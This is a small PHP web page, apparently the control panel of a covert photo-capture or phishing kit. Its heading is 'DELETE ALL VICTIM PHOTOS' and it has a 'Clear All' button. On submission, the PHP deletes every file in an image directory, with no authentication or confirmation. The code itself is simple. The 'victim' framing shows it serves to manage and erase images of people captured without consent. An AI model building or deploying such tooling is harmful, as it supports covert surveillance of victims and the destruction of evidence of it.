 <?php
if (isset($_POST['formGoBack'])){

                     $directory = "../image/"; // Replace with the actual directory path
                     $files = scandir($directory);
                     
                     foreach ($files as $file) {
                         if ($file !== '.' && $file !== '..') {
                           
                           unlink("../image/".$file);
                 echo "Success.";          

          }
          
          
          }
                         }
                         
         
         
         
                     
                     
                 

?>
<html>
  <head>
      <meta name="viewport" content="width=device-width, initial-scale=1">
       <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css">
  <link rel="stylesheet"  href="https://fonts.googleapis.com/css?family=Montserrat&display=swap">

  </head>
  <body>

<h1>DELETE ALL VICTIM PHOTOS</h1>
<form id="formGoBack" action="" method="post">
    <button type="submit" name="formGoBack" class="btn btn-danger" >Clear All</button>
    
   
  
</form>
<body></body>

</html>